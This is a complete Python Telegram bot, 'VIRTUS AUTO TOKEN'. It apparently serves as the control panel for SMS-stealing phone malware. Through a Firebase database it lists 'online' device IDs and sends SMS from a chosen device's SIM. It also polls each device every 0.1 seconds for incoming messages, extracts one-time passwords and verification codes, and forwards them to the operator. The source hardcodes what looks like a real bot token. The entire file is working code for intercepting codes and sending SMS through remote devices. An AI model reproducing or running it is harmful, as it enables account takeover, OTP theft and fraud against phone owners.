import asyncio
import json
import logging
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any

import requests
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ===== BOT TOKEN =====
BOT_TOKEN = os.getenv("BOT_TOKEN", "8901092528:AAFQ23IMYD5oVL1cNEquLphWc5RYij0FJZw")
DATA_FILE = Path(os.getenv("USER_DATA_FILE", "user_data.json"))
DEFAULT_BASE_URL = os.getenv("DEFAULT_BASE_URL", "")
SMS_TIMEOUT = float(os.getenv("SMS_TIMEOUT", "2"))
POLL_INTERVAL = float(os.getenv("POLL_INTERVAL", "0.1"))
EXECUTOR = ThreadPoolExecutor(max_workers=20)

# base_url cache: firebase_url+device_id -> url
_base_url_cache: dict[str, str] = {}

logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger(__name__)

# ===== PATTERNS =====
PATTERN_SIMPLE = re.compile(r"(\+?\d{10,15})\s*\|\s*(.*)")
PATTERN_RICH = re.compile(r"To:\s*(\+?\d{10,15}).*?Message:\s*(.*)", re.DOTALL)
PATTERN_INCOMING = re.compile(
    r"(?:From|Sender|📱)\s*:?\s*(\+?\d{10,15}).*?(?:Message|Body|Text|Msg)\s*:?\s*(.+)",
    re.DOTALL | re.IGNORECASE,
)
PATTERN_INCOMING_ALT = re.compile(
    r"(?:New SMS|SMS from|📩|📨|Received SMS)\s*[:\-]?\s*(\+?\d{10,15})\s*[:\-]\s*(.+)",
    re.IGNORECASE,
)
OTP_KEYWORD = re.compile(r"otp|one.?time|verification|verify|code|password|pin", re.IGNORECASE)
OTP_DIGIT = re.compile(r"(?<!\d)(\d{4,8})(?!\d)")

# ===== KEYBOARDS =====
MAIN_KEYBOARD = ReplyKeyboardMarkup(
    [
        [KeyboardButton("▶️ Start Listen")],
        [KeyboardButton("📱 Change Device"), KeyboardButton("🔥 Change Firebase")],
        [KeyboardButton("📊 Status"), KeyboardButton("👥 Change")],
        [KeyboardButton("❓ Help")],
    ],
    resize_keyboard=True,
)

SETUP_KEYBOARD = ReplyKeyboardMarkup(
    [
        [KeyboardButton("📱 Online Devices")],
        [KeyboardButton("🔥 Set Firebase URL")],
        [KeyboardButton("👥 Change")],
        [KeyboardButton("📊 Status"), KeyboardButton("❓ Help")],
    ],
    resize_keyboard=True,
)

SIM_KEYBOARD = ReplyKeyboardMarkup(
    [
        [KeyboardButton("🔢 Select SIM")],
        [KeyboardButton("📱 Change Device"), KeyboardButton("📊 Status")],
    ],
    resize_keyboard=True,
)

# Per-user duplicate tracking while listening
last_sent: dict[int, set[str]] = {}
last_otp_seen: dict[int, float] = {}
processed_msg_ids: set[str] = set()


@dataclass
class UserConfig:
    firebase_url: str = ""
    chat_id: int = 0
    chat_name: str = ""
    device_id: str = ""
    sim: str = "1"
    listening: bool = False
    listener_active: bool = False
    listen_started_at: float = 0.0
    step: str = "start"
    waiting_for: str = ""  # firebase | group | base_url
    base_url: str = ""


def load_all_users() -> dict[str, dict[str, Any]]:
    if DATA_FILE.exists():
        try:
            return json.loads(DATA_FILE.read_text(encoding="utf-8"))
        except json.JSONDecodeError:
            return {}
    return {}


def save_all_users(data: dict[str, dict[str, Any]]) -> None:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    DATA_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")


def get_config(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> UserConfig:
    if "config" not in context.user_data:
        stored = load_all_users().get(str(user_id), {})
        context.user_data["config"] = UserConfig(**{k: v for k, v in stored.items() if k in UserConfig.__dataclass_fields__})
    return context.user_data["config"]


def persist_config(user_id: int, cfg: UserConfig) -> None:
    data = load_all_users()
    data[str(user_id)] = asdict(cfg)
    save_all_users(data)


def firebase_get(url: str, path: str) -> Any:
    res = requests.get(f"{url.rstrip('/')}/{path.lstrip('/')}.json", timeout=10)
    res.raise_for_status()
    return res.json()


def fetch_base_url(firebase_url: str, device_id: str = "", user_base_url: str = "") -> str:
    if user_base_url:
        return user_base_url.rstrip("/")

    cache_key = f"{firebase_url}|{device_id}"
    if cache_key in _base_url_cache:
        return _base_url_cache[cache_key]

    if not firebase_url:
        return DEFAULT_BASE_URL.rstrip("/")

    candidates: list[str] = []

    for path in ("config", "settings", ""):
        try:
            node = firebase_get(firebase_url, path) if path else firebase_get(firebase_url, "")
            if isinstance(node, dict):
                for key in ("base_url", "baseUrl", "serverUrl", "api_url", "apiUrl", "host", "server"):
                    val = node.get(key)
                    if val and isinstance(val, str) and val.startswith("http"):
                        candidates.append(val.rstrip("/"))
        except Exception:
            pass

    if device_id:
        try:
            client = firebase_get(firebase_url, f"clients/{device_id}") or {}
            if isinstance(client, dict):
                for key in ("base_url", "baseUrl", "serverUrl", "api_url", "apiUrl", "host", "server", "url"):
                    val = client.get(key)
                    if val and isinstance(val, str) and val.startswith("http"):
                        candidates.append(val.rstrip("/"))
        except Exception:
            pass

    result = candidates[0] if candidates else DEFAULT_BASE_URL.rstrip("/")
    if result:
        _base_url_cache[cache_key] = result
    return result


def fetch_online_devices(firebase_url: str) -> list[str]:
    try:
        clients = firebase_get(firebase_url, "clients") or {}
        if not isinstance(clients, dict):
            return []

        online: list[str] = []
        for device_id, info in clients.items():
            if info is None:
                online.append(device_id)
            elif isinstance(info, dict):
                if info.get("online", True):
                    online.append(device_id)
            else:
                online.append(device_id)
        return online
    except Exception as exc:
        log.warning("devices fetch failed: %s", exc)
        return []


def parse_sms(text: str) -> tuple[str, str] | None:
    match = PATTERN_SIMPLE.search(text)
    if not match:
        match = PATTERN_RICH.search(text)
    if not match:
        return None
    number = match.group(1).replace(" ", "")
    body = match.group(2).strip().replace("\n", " ")
    return number, body


def parse_incoming_sms(text: str) -> tuple[str, str] | None:
    """Device se aaya hua SMS/OTP parse karo."""
    for pattern in (PATTERN_INCOMING, PATTERN_INCOMING_ALT):
        match = pattern.search(text)
        if match:
            return match.group(1).replace(" ", ""), match.group(2).strip().replace("\n", " ")

    # Plain OTP message without structured format
    if OTP_KEYWORD.search(text) or OTP_DIGIT.search(text):
        otp = extract_otp(text)
        if otp:
            return "Device", text.strip()
    return None


def extract_otp(text: str) -> str | None:
    if OTP_KEYWORD.search(text):
        match = OTP_DIGIT.search(text)
        if match:
            return match.group(1)
    if len(text) < 400:
        match = OTP_DIGIT.search(text)
        if match and len(match.group(1)) >= 4:
            return match.group(1)
    return None


def is_outbound_command(text: str) -> bool:
    """number | message = SMS bhejne ka command."""
    if PATTERN_SIMPLE.search(text) or PATTERN_RICH.search(text):
        if PATTERN_INCOMING.search(text) or PATTERN_INCOMING_ALT.search(text):
            return False
        return True
    return False


def send_sms(base_url: str, device_id: str, sim_index: int, to_number: str, message: str) -> tuple[bool, int, str]:
    if not base_url:
        return False, 0, "BASE_URL missing — Firebase config/base_url set karo ya bot mein API URL daalo"
    url = f"{base_url.rstrip('/')}/clients/{device_id}/webhookEvent/sendSms.json"
    payload = {"from": sim_index, "to": to_number, "message": message, "isSended": False}
    try:
        res = requests.patch(url, json=payload, timeout=SMS_TIMEOUT)
        return res.status_code == 200, res.status_code, ""
    except requests.RequestException as exc:
        return False, 0, str(exc)


def status_text(cfg: UserConfig) -> str:
    listening = "ON" if cfg.listening else "OFF"
    active = "YES" if cfg.listener_active else "NO"
    api = cfg.base_url or fetch_base_url(cfg.firebase_url, cfg.device_id) or "—"
    return (
        f"Firebase URL: {cfg.firebase_url or '—'}\n"
        f"API URL: {api}\n"
        f"Device ID: {cfg.device_id or '—'}\n"
        f"SIM: {cfg.sim or '—'}\n"
        f"Chat Name: {cfg.chat_name or '—'}\n"
        f"Chat ID: {cfg.chat_id or '—'}\n"
        f"Step: {cfg.step}\n"
        f"Listening: {listening}\n"
        f"Listener active: {active}"
    )


def ready_for_listen(cfg: UserConfig) -> bool:
    return bool(cfg.firebase_url and cfg.chat_id and cfg.device_id and cfg.sim in ("1", "2"))


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    cfg.step = "start"
    persist_config(update.effective_user.id, cfg)

    await update.message.reply_text(
        "🚀 *VIRTUS AUTO TOKEN*\n\n"
        "Setup steps:\n"
        "1️⃣ 👥 Change → group/channel set karo\n"
        "2️⃣ 🔥 Change Firebase → Firebase URL daalo\n"
        "3️⃣ 📱 Change Device → online device select karo\n"
        "4️⃣ 🔢 Select SIM → SIM 1 ya 2\n"
        "5️⃣ ▶️ Start Listen → listening shuru\n\n"
        "Pehle *👥 Change* dabao aur apna group/channel set karo.",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "❓ *Help*\n\n"
        "*Setup Commands:*\n"
        "/setgroup — Group/Channel set karo\n"
        "/setfirebase — Firebase URL set karo\n"
        "/setapi — SMS API URL set karo (FAIL fix)\n"
        "/status — Current config dekho\n\n"
        "*Buttons:*\n"
        "▶️ Start Listen — SMS sunna shuru\n"
        "📱 Change Device — Device badlo\n"
        "🔥 Change Firebase — Firebase URL badlo\n"
        "👥 Change — Group/Channel badlo\n"
        "📊 Status — Config dekho\n\n"
        "*Important:* @BotFather mein /setprivacy → *Disable* karo,\n"
        "ya bot ko group/channel ka *Admin* banao.",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    await update.message.reply_text(status_text(cfg), reply_markup=MAIN_KEYBOARD)


async def cmd_setgroup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    cfg.waiting_for = "group"
    persist_config(update.effective_user.id, cfg)
    await update.message.reply_text(
        "👥 *Set Group or Channel*\n\n"
        "Ye chat sab future Firebase setups ke liye save hogi.\n\n"
        "Bhejo:\n"
        "• Group se koi message *forward* karo\n"
        "• `@username` bhejo\n"
        "• Numeric chat ID (jaise `-1003553669855`)\n"
        "• Invite link `t.me/...`",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def cmd_setfirebase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    cfg.waiting_for = "firebase"
    persist_config(update.effective_user.id, cfg)
    await update.message.reply_text(
        "🔥 *Send your Firebase Realtime Database URL*\n\n"
        "Example:\n`https://your-project-default-rtdb.firebaseio.com`",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def save_chat(update: Update, context: ContextTypes.DEFAULT_TYPE, chat_id: int, chat_name: str) -> None:
    user_id = update.effective_user.id
    cfg = get_config(user_id, context)
    cfg.chat_id = chat_id
    cfg.chat_name = chat_name
    cfg.waiting_for = ""
    cfg.step = "firebase" if not cfg.firebase_url else ("device" if not cfg.device_id else cfg.step)
    persist_config(user_id, cfg)

    await update.message.reply_text(
        f"✅ Chat saved: *{chat_name}*\n"
        f"📌 Kept for all Firebase setups.\n\n"
        f"Step 2: Firebase URL set karo.\n"
        f"Tap *🔥 Change Firebase* ya /setfirebase bhejo.",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def save_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE, url: str) -> None:
    user_id = update.effective_user.id
    cfg = get_config(user_id, context)
    cfg.firebase_url = url.rstrip("/")
    cfg.waiting_for = ""
    cfg.step = "device"

    try:
        firebase_get(cfg.firebase_url, "")
        connected = True
    except Exception:
        connected = False

    persist_config(user_id, cfg)

    msg = (
        f"✅ Firebase URL saved!\n"
        f"`{cfg.firebase_url}`\n\n"
    )
    if connected:
        msg += "✅ Firebase connected!\n\n"
    else:
        msg += "⚠️ Firebase connect check fail — URL verify karo.\n\n"

    msg += "Step 3: Online device select karo.\nTap *📱 Change Device*"
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)


async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    if not cfg.firebase_url:
        await update.message.reply_text("❌ Pehle Firebase URL set karo.\n/setfirebase", reply_markup=MAIN_KEYBOARD)
        return

    devices = fetch_online_devices(cfg.firebase_url)
    if not devices:
        await update.message.reply_text(
            "❌ Koi online device nahi mila.\n\n"
            "Firebase mein `clients` node check karo.\n"
            "Example:\n"
            "`/clients/device-id/online: true`",
            reply_markup=MAIN_KEYBOARD,
        )
        return

    buttons = [[InlineKeyboardButton(d[:20] + ("..." if len(d) > 20 else ""), callback_data=f"dev:{d}")] for d in devices[:20]]
    await update.message.reply_text(
        "📱 *Online Devices*\nTap karke select karo:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def show_sim_select(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    if not cfg.device_id:
        await update.message.reply_text("❌ Pehle device select karo.", reply_markup=MAIN_KEYBOARD)
        return

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("SIM 1", callback_data="sim:1")],
            [InlineKeyboardButton("SIM 2", callback_data="sim:2")],
        ]
    )
    await update.message.reply_text("🔢 *Select SIM slot:*", parse_mode="Markdown", reply_markup=keyboard)


async def start_listen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    cfg = get_config(user_id, context)

    if not ready_for_listen(cfg):
        missing = []
        if not cfg.chat_id:
            missing.append("Group/Channel")
        if not cfg.firebase_url:
            missing.append("Firebase URL")
        if not cfg.device_id:
            missing.append("Device")
        if cfg.sim not in ("1", "2"):
            missing.append("SIM")
        await update.message.reply_text(
            f"❌ Setup incomplete. Missing: {', '.join(missing)}\n\n/status se check karo.",
            reply_markup=MAIN_KEYBOARD,
        )
        return

    cfg.listening = True
    cfg.listener_active = True
    cfg.listen_started_at = time.time()
    cfg.step = "ready"
    persist_config(user_id, cfg)
    last_sent[user_id] = set()

    await update.message.reply_text(
        "🟢 *Listening started!*\n\n"
        "Important: @BotFather mein /setprivacy → *Disable* karo,\n"
        "ya bot ko group/channel ka *Admin* banao taaki messages padh sake.\n\n"
        f"🟢 Listening on *{cfg.chat_name}*.\n"
        "Parsed messages Firebase device se SMS bhejenge.",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    cfg = get_config(user_id, context)
    data = query.data or ""

    if data.startswith("dev:"):
        device_id = data[4:]
        cfg.device_id = device_id
        cfg.step = "sim"
        persist_config(user_id, cfg)
        await query.edit_message_text(f"✅ Device selected: `{device_id}`", parse_mode="Markdown")
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=(
                f"✅ Device: `{device_id}`\n"
                f"📌 Saved chat: *{cfg.chat_name or '—'}*\n\n"
                "Step 4: SIM slot select karo.\nTap *🔢 Select SIM*"
            ),
            parse_mode="Markdown",
            reply_markup=SIM_KEYBOARD,
        )
        return

    if data.startswith("sim:"):
        sim = data[4:]
        cfg.sim = sim
        cfg.step = "ready"
        persist_config(user_id, cfg)
        await query.edit_message_text(f"✅ SIM {sim} selected.")
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=(
                "✅ *All set!*\n"
                f"📌 Saved chat: *{cfg.chat_name or '—'}*\n\n"
                "Step 5: Start listening.\nTap *▶️ Start Listen*"
            ),
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD,
        )


async def handle_private_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.effective_user:
        return

    user_id = update.effective_user.id
    cfg = get_config(user_id, context)
    text = (update.message.text or "").strip()

    # Menu buttons
    if text in ("▶️ Start Listen", "Start Listen"):
        await start_listen(update, context)
        return
    if text in ("📱 Change Device", "📱 Online Devices", "Online Devices"):
        await show_devices(update, context)
        return
    if text in ("🔥 Change Firebase", "🔥 Set Firebase URL", "Set Firebase URL"):
        await cmd_setfirebase(update, context)
        return
    if text in ("👥 Change", "Change"):
        await cmd_setgroup(update, context)
        return
    if text in ("📊 Status", "Status"):
        await cmd_status(update, context)
        return
    if text in ("❓ Help", "Help"):
        await cmd_help(update, context)
        return
    if text in ("🔢 Select SIM", "Select SIM"):
        await show_sim_select(update, context)
        return

    # Waiting for API URL
    if cfg.waiting_for == "base_url":
        if not text.startswith("http"):
            await update.message.reply_text("❌ Valid API URL bhejo.\nExample: https://api.example.com")
            return
        cfg.base_url = text.rstrip("/")
        cfg.waiting_for = ""
        persist_config(user_id, cfg)
        await update.message.reply_text(f"✅ API URL saved!\n`{cfg.base_url}`", parse_mode="Markdown")
        return

    # Waiting for firebase URL
    if cfg.waiting_for == "firebase":
        if not text.startswith("http"):
            await update.message.reply_text("❌ Valid Firebase URL bhejo.\nExample: https://xxx-default-rtdb.firebaseio.com")
            return
        await save_firebase(update, context, text)
        return

    # Waiting for group
    if cfg.waiting_for == "group" or text.startswith("-100") or text.startswith("@"):
        # Forwarded message
        if update.message.forward_origin:
            origin = update.message.forward_origin
            chat = getattr(origin, "chat", None) or getattr(origin, "sender_chat", None)
            if chat:
                await save_chat(update, context, chat.id, chat.title or chat.username or str(chat.id))
                return

        # Numeric chat ID
        if re.fullmatch(r"-?\d+", text):
            try:
                chat = await context.bot.get_chat(int(text))
                await save_chat(update, context, chat.id, chat.title or chat.username or text)
                return
            except Exception as exc:
                await update.message.reply_text(f"❌ Chat ID invalid: {exc}")
                return

        # @username
        if text.startswith("@"):
            try:
                chat = await context.bot.get_chat(text)
                await save_chat(update, context, chat.id, chat.title or chat.username or text)
                return
            except Exception as exc:
                await update.message.reply_text(f"❌ Username resolve fail: {exc}")
                return

        # t.me link
        if "t.me/" in text:
            username = text.rstrip("/").split("/")[-1]
            if username.startswith("+"):
                await update.message.reply_text("❌ Private invite link ke liye group se message forward karo.")
                return
            try:
                chat = await context.bot.get_chat(f"@{username}")
                await save_chat(update, context, chat.id, chat.title or chat.username or username)
                return
            except Exception as exc:
                await update.message.reply_text(f"❌ Link resolve fail: {exc}")
                return


async def cmd_setapi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cfg = get_config(update.effective_user.id, context)
    cfg.waiting_for = "base_url"
    persist_config(update.effective_user.id, cfg)
    await update.message.reply_text(
        "🔗 *SMS API URL bhejo*\n\n"
        "Example:\n`https://api.your-sms-server.com`\n\n"
        "Ye URL Firebase `config/base_url` ki jagah use hoga.",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD,
    )


async def notify_otp(bot, user_id: int, sender: str, body: str, chat_name: str) -> None:
    otp = extract_otp(body) or body[:50]
    await bot.send_message(
        chat_id=user_id,
        text=(
            "🔐 *OTP Received*\n\n"
            f"*From:* `{sender}`\n"
            f"*OTP:* `{otp}`\n"
            f"*Full:* `{body[:300]}`\n"
            f"*Channel:* {chat_name}"
        ),
        parse_mode="Markdown",
    )


async def process_outbound_sms(
    bot,
    user_id: int,
    to_number: str,
    sms_body: str,
    base_url: str,
    device_id: str,
    sim_index: int,
    chat_name: str,
) -> None:
    loop = asyncio.get_running_loop()
    ok, status_code, err = await loop.run_in_executor(
        EXECUTOR,
        send_sms,
        base_url,
        device_id,
        sim_index,
        to_number,
        sms_body,
    )

    if ok:
        status = "✅ SENT"
        err_line = ""
    elif status_code == 0:
        status = "❌ FAIL"
        err_line = f"\n*Error:* {err or 'API URL missing'}"
    else:
        status = f"❌ FAIL ({status_code})"
        err_line = f"\n*Error:* {err}" if err else ""

    await bot.send_message(
        chat_id=user_id,
        text=(
            f"⏳ → `{to_number}`\n\n"
            "📬 *SMS Delivery Report*\n\n"
            f"*STATUS:* {status}\n"
            f"*To:* `{to_number}`\n"
            f"*Message:* `{sms_body[:200]}`\n"
            f"*From:* {chat_name}{err_line}"
        ),
        parse_mode="Markdown",
    )


async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    if not msg or not msg.text:
        return

    msg_uid = f"{update.effective_chat.id}:{msg.message_id}"
    if msg_uid in processed_msg_ids:
        return
    processed_msg_ids.add(msg_uid)
    if len(processed_msg_ids) > 5000:
        processed_msg_ids.clear()

    chat_id = update.effective_chat.id
    text = msg.text.strip()
    all_users = load_all_users()

    for uid_str, stored in all_users.items():
        if not stored.get("listening") or not stored.get("listener_active"):
            continue
        if stored.get("chat_id") != chat_id:
            continue

        started = stored.get("listen_started_at", 0)
        if msg.date.timestamp() < started:
            continue

        user_id = int(uid_str)
        chat_name = stored.get("chat_name", "Virtus Auto Token")
        firebase_url = stored.get("firebase_url", "")
        device_id = stored.get("device_id", "")
        sim_index = 0 if str(stored.get("sim", "1")) == "1" else 1
        base_url = fetch_base_url(firebase_url, device_id, stored.get("base_url", ""))

        # ===== INCOMING OTP (device se aaya) — instant forward =====
        incoming = parse_incoming_sms(text)
        if incoming and not is_outbound_command(text):
            sender, body = incoming
            dup = f"otp-{sender}-{body[:80]}"
            if user_id not in last_sent:
                last_sent[user_id] = set()
            if dup in last_sent[user_id]:
                continue
            last_sent[user_id].add(dup)
            try:
                await notify_otp(context.bot, user_id, sender, body, chat_name)
            except Exception as exc:
                log.warning("otp notify failed: %s", exc)
            continue

        # ===== OUTBOUND SMS command (number | message) =====
        if not is_outbound_command(text):
            # Generic OTP in any format
            otp = extract_otp(text)
            if otp:
                dup = f"otp-plain-{text[:80]}"
                if user_id not in last_sent:
                    last_sent[user_id] = set()
                if dup not in last_sent[user_id]:
                    last_sent[user_id].add(dup)
                    try:
                        await notify_otp(context.bot, user_id, "Channel", text, chat_name)
                    except Exception:
                        pass
            continue

        parsed = parse_sms(text)
        if not parsed:
            continue

        to_number, sms_body = parsed
        dup_key = f"{to_number}-{sms_body}"

        if user_id not in last_sent:
            last_sent[user_id] = set()
        if dup_key in last_sent[user_id]:
            continue
        last_sent[user_id].add(dup_key)

        asyncio.create_task(
            process_outbound_sms(
                context.bot, user_id, to_number, sms_body,
                base_url, device_id, sim_index, chat_name,
            )
        )


async def poll_firebase_otp(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Firebase se device OTP har 0.1 sec check karo."""
    all_users = load_all_users()
    loop = asyncio.get_running_loop()

    for uid_str, stored in all_users.items():
        if not stored.get("listening") or not stored.get("listener_active"):
            continue

        user_id = int(uid_str)
        firebase_url = stored.get("firebase_url", "")
        device_id = stored.get("device_id", "")
        if not firebase_url or not device_id:
            continue

        if user_id not in last_otp_seen:
            last_otp_seen[user_id] = time.time()

        try:
            client = await loop.run_in_executor(
                EXECUTOR, firebase_get, firebase_url, f"clients/{device_id}"
            )
        except Exception:
            continue

        if not isinstance(client, dict):
            continue

        for key in ("lastSms", "lastMessage", "receivedSms", "latestOtp", "otp", "incoming"):
            data = client.get(key)
            if not data:
                continue

            if isinstance(data, str):
                body, ts, sender = data, time.time(), "Device"
            elif isinstance(data, dict):
                body = str(data.get("message") or data.get("body") or data.get("text") or "")
                sender = str(data.get("from") or data.get("sender") or "Device")
                ts = float(data.get("timestamp") or data.get("time") or time.time())
            else:
                continue

            if not body or ts <= last_otp_seen[user_id]:
                continue

            otp = extract_otp(body)
            if not otp:
                continue

            last_otp_seen[user_id] = ts
            dup = f"fb-{otp}-{body[:40]}"
            if user_id not in last_sent:
                last_sent[user_id] = set()
            if dup in last_sent[user_id]:
                continue
            last_sent[user_id].add(dup)

            chat_name = stored.get("chat_name", "Virtus Auto Token")
            try:
                await notify_otp(context.bot, user_id, sender, body, chat_name)
            except Exception as exc:
                log.warning("firebase otp poll failed: %s", exc)
            break


def main() -> None:
    print("\n🚀 VIRTUS AUTO TOKEN BOT STARTING\n")
    print(f"⚡ Poll interval: {POLL_INTERVAL}s | SMS timeout: {SMS_TIMEOUT}s\n")

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("setgroup", cmd_setgroup))
    app.add_handler(CommandHandler("setfirebase", cmd_setfirebase))
    app.add_handler(CommandHandler("setapi", cmd_setapi))

    app.add_handler(CallbackQueryHandler(callback_handler))

    app.add_handler(
        MessageHandler(
            filters.ChatType.PRIVATE & filters.TEXT & (~filters.COMMAND),
            handle_private_text,
        )
    )
    app.add_handler(
        MessageHandler(
            filters.UpdateType.CHANNEL_POST & filters.TEXT,
            handle_channel_message,
        )
    )
    app.add_handler(
        MessageHandler(
            (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP)
            & filters.TEXT
            & (~filters.COMMAND),
            handle_channel_message,
        )
    )

    # Firebase OTP poll — har 0.1 sec
    app.job_queue.run_repeating(poll_firebase_otp, interval=POLL_INTERVAL, first=0.5)

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
